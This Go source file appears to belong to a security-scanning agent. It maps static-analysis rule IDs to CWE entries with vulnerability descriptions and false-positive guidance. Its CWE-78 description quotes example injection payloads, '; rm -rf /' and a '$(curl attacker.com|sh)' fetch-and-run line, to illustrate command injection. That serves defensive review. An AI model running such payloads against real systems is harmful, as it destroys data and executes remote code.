package agent

import "strings"

type cweEntry struct {
	ID             string
	Name           string
	Brief          string
	FalsePositives string
}

var ruleCWE = map[string]string{
	"GO-CMD-INJECTION-TAINT":   "CWE-78",
	"GO-CMD-SHELL":             "CWE-78",
	"GO-SSRF-TAINT":            "CWE-918",
	"GO-PATH-TRAVERSAL-TAINT":  "CWE-22",
	"GO-HARDCODED-SECRET":      "CWE-798",
	"GO-CRYPTO-WEAK":           "CWE-327",
	"GO-RAND-INSECURE":         "CWE-330",
	"GO-TLS-SKIP-VERIFY":       "CWE-295",
	"GO-DESERIALIZE-UNTRUSTED": "CWE-502",
	"GO-HTTP-NO-TLS":           "CWE-319",
	"GO-FILE-PERMISSIVE":       "CWE-732",
	"PY-EVAL":                  "CWE-94",
	"PY-EXEC":                  "CWE-94",
	"PY-OS-SYSTEM":             "CWE-78",
	"PY-SUBPROCESS-SHELL":      "CWE-78",
	"PY-PICKLE":                "CWE-502",
	"PY-YAML-LOAD":             "CWE-502",
	"PY-SQL-INJECT":            "CWE-89",
	"PY-WEAK-HASH":             "CWE-327",
	"PY-INSECURE-RANDOM":       "CWE-330",
	"PY-HARDCODED-SECRET":      "CWE-798",
	"C-GETS":                   "CWE-120",
	"C-STRCPY":                 "CWE-120",
	"C-STRCAT":                 "CWE-120",
	"C-SPRINTF":                "CWE-120",
	"C-SYSTEM":                 "CWE-78",
	"C-PRINTF-FMT":             "CWE-134",
	"C-RAND":                   "CWE-330",
	"C-WEAK-CRYPTO":            "CWE-327",
	"CS-SQL-CONCAT":            "CWE-89",
	"CS-BINARY-FORMATTER":      "CWE-502",
	"CS-TLS-BYPASS":            "CWE-295",
	"CS-WEAK-HASH-MD5":         "CWE-327",
	"CS-WEAK-HASH-SHA1":        "CWE-327",
	"CS-INSECURE-RANDOM":       "CWE-330",
	"CS-XXE":                   "CWE-611",
}

var cweDB = map[string]cweEntry{
	"CWE-78": {
		ID:   "CWE-78",
		Name: "OS Command Injection",
		Brief: "Attacker controls part of an OS command executed by the application. " +
			"Can lead to arbitrary code execution, data exfiltration, or full system compromise. " +
			"CRITICAL PATTERN: exec.Command(\"sh\", \"-c\", \"literal \"+userInput) is ALWAYS " +
			"vulnerable — the shell interprets the entire third argument as a command string, " +
			"allowing injection of '; rm -rf /' or '$(curl attacker.com|sh)'. " +
			"The -c flag being a separate argument does NOT make it safe. " +
			"Safe alternative: exec.Command(\"ping\", \"-c\", \"1\", userInput) with allowlist validation.",
		FalsePositives: "False positive ONLY if every component of the command string is a compile-time constant with no user-controlled parts. If any variable from request params, env, or external input appears in the shell string, it IS vulnerable.",
	},
	"CWE-89": {
		ID:   "CWE-89",
		Name: "SQL Injection",
		Brief: "User input is concatenated into a SQL query without parameterization. " +
			"Allows attackers to read or modify any data, bypass authentication, and in some cases execute OS commands. " +
			"Consistently in OWASP Top 10; CVSS critical when exploitable.",
		FalsePositives: "False positive if the variable is validated against a strict allowlist or the query runs against a non-user-facing internal store.",
	},
	"CWE-22": {
		ID:   "CWE-22",
		Name: "Path Traversal",
		Brief: "Attacker supplies '../' sequences to escape the intended directory and access arbitrary files. " +
			"Can expose sensitive configs, private keys, or allow overwriting system files. " +
			"Common in file upload/download features.",
		FalsePositives: "False positive if filepath.Clean() + a prefix check against the allowed base dir is already applied upstream.",
	},
	"CWE-798": {
		ID:   "CWE-798",
		Name: "Use of Hard-coded Credentials",
		Brief: "Secrets committed to source control are visible to everyone with repo access and persist in git history forever. " +
			"Leaked keys frequently appear in automated credential-scanning on GitHub within minutes of a push. " +
			"CVSS HIGH/CRITICAL for production credentials.",
		FalsePositives: "False positive for test/example constants clearly scoped to tests, or placeholder strings like 'YOUR_KEY_HERE'.",
	},
	"CWE-327": {
		ID:   "CWE-327",
		Name: "Broken or Risky Cryptographic Algorithm",
		Brief: "MD5 and SHA-1 are collision-broken (Shattered attack, 2017). DES/3DES have insufficient key length. " +
			"Using them for password hashing, signing, or integrity checks allows practical attacks. " +
			"NIST deprecated SHA-1 for security use in 2011.",
		FalsePositives: "False positive if the digest is used purely for non-security purposes like cache keys or deduplication checksums explicitly not security-sensitive.",
	},
	"CWE-330": {
		ID:   "CWE-330",
		Name: "Use of Insufficiently Random Values",
		Brief: "math/rand, random.random(), System.Random are seeded PRNGs, not CSPRNGs. " +
			"Outputs are predictable if the seed is known or guessable. " +
			"Must not be used for session tokens, password reset tokens, CSRF tokens, or cryptographic nonces.",
		FalsePositives: "False positive if the random value is used for non-security purposes: game mechanics, load balancing, UI randomization.",
	},
	"CWE-295": {
		ID:   "CWE-295",
		Name: "Improper Certificate Validation",
		Brief: "Disabling TLS certificate verification allows a man-in-the-middle attacker to intercept all encrypted traffic. " +
			"Any data sent over the connection (passwords, tokens, PII) is exposed. " +
			"Never acceptable in production; sometimes seen in test code that leaks to prod.",
		FalsePositives: "False positive only in genuine non-production test environments where the code path cannot reach production.",
	},
	"CWE-502": {
		ID:   "CWE-502",
		Name: "Deserialization of Untrusted Data",
		Brief: "Pickle/BinaryFormatter/gob.Decode can execute arbitrary code when deserializing attacker-controlled bytes. " +
			"Exploited in numerous RCE CVEs (Apache, Java deserialization chains). " +
			"Do not deserialize data from untrusted sources with these formats.",
		FalsePositives: "False positive if the serialized data is only ever produced by the same trusted process and never crosses a trust boundary.",
	},
	"CWE-94": {
		ID:   "CWE-94",
		Name: "Code Injection",
		Brief: "eval()/exec() with user-controlled input allows remote code execution in the interpreter. " +
			"Severity is always CRITICAL when user data reaches the eval sink. " +
			"Legitimate uses (dynamic code, DSLs) almost never require eval on untrusted input.",
		FalsePositives: "False positive if the eval argument is constructed entirely from server-side constants.",
	},
	"CWE-918": {
		ID:   "CWE-918",
		Name: "Server-Side Request Forgery (SSRF)",
		Brief: "Attacker controls the URL of an outgoing HTTP request, forcing the server to probe internal services. " +
			"In cloud environments (AWS/GCP/Azure) this commonly leads to metadata endpoint access and credential theft. " +
			"CVSS HIGH; OWASP Top 10 A10:2021.",
		FalsePositives: "False positive if the URL is strictly validated against an allowlist of known-good domains before this call.",
	},
	"CWE-120": {
		ID:   "CWE-120",
		Name: "Buffer Copy Without Checking Size",
		Brief: "Functions like strcpy/gets write without length limit, overwriting adjacent memory. " +
			"Classic cause of stack/heap overflows leading to RCE or privilege escalation. " +
			"C standard library versions without bounds-checking are intrinsically unsafe.",
		FalsePositives: "Context matters: if destination is statically sized and source is provably shorter, it may be safe—but review is still warranted.",
	},
	"CWE-134": {
		ID:   "CWE-134",
		Name: "Uncontrolled Format String",
		Brief: "printf(user_input) lets an attacker read stack memory with %x/%s and write with %n. " +
			"Can escalate to arbitrary write → code execution. " +
			"First argument to printf must always be a string literal.",
		FalsePositives: "False positive if the first argument is a string constant even if it looks like a variable (e.g., a preprocessor macro expanding to a literal).",
	},
	"CWE-611": {
		ID:   "CWE-611",
		Name: "Improper Restriction of XML External Entity Reference",
		Brief: "XML parsers that resolve external entities can be tricked into reading local files, performing SSRF, or causing DoS. " +
			"XXE was OWASP A4 for years; still common in Java/C# XML processing. " +
			"Mitigation: disable DTD processing and external entity resolution.",
		FalsePositives: "False positive if DtdProcessing = Prohibit and XmlResolver = null are set after instantiation.",
	},
	"CWE-319": {
		ID:   "CWE-319",
		Name: "Cleartext Transmission of Sensitive Information",
		Brief: "Plain HTTP exposes credentials, session tokens, and sensitive data to any network observer. " +
			"In containerized/cloud environments, internal traffic is not automatically trusted. " +
			"Severity depends on what traverses the unencrypted channel.",
		FalsePositives: "False positive if the service is behind a TLS-terminating load balancer and all external traffic is encrypted.",
	},
	"CWE-732": {
		ID:   "CWE-732",
		Name: "Incorrect Permission Assignment for Critical Resource",
		Brief: "World-writable files or directories (0777) can be modified by any local user or process. " +
			"On shared systems this creates privilege escalation paths. " +
			"Secrets written to world-readable files are exposed to any process on the host.",
		FalsePositives: "False positive for truly public, non-sensitive files intentionally shared between users.",
	},
}

func GetCWEContext(ruleID, title string) string {
	cweID, ok := ruleCWE[ruleID]
	if !ok {
		upper := strings.ToUpper(ruleID)
		for keyword, id := range map[string]string{
			"SQL":        "CWE-89",
			"INJECTION":  "CWE-78",
			"TRAVERSAL":  "CWE-22",
			"SSRF":       "CWE-918",
			"SECRET":     "CWE-798",
			"CRYPTO":     "CWE-327",
			"RANDOM":     "CWE-330",
			"DESERIALIZ": "CWE-502",
			"TLS":        "CWE-295",
			"CERT":       "CWE-295",
			"FORMAT":     "CWE-134",
			"BUFFER":     "CWE-120",
			"XXE":        "CWE-611",
		} {
			if strings.Contains(upper, keyword) {
				cweID = id
				ok = true
				break
			}
		}
	}
	if !ok {
		return ""
	}
	entry, ok := cweDB[cweID]
	if !ok {
		return ""
	}
	var sb strings.Builder
	sb.WriteString("Security context (")
	sb.WriteString(entry.ID)
	sb.WriteString(" — ")
	sb.WriteString(entry.Name)
	sb.WriteString("):\n")
	sb.WriteString(entry.Brief)
	sb.WriteString("\nCommon false-positive patterns: ")
	sb.WriteString(entry.FalsePositives)
	return sb.String()
}
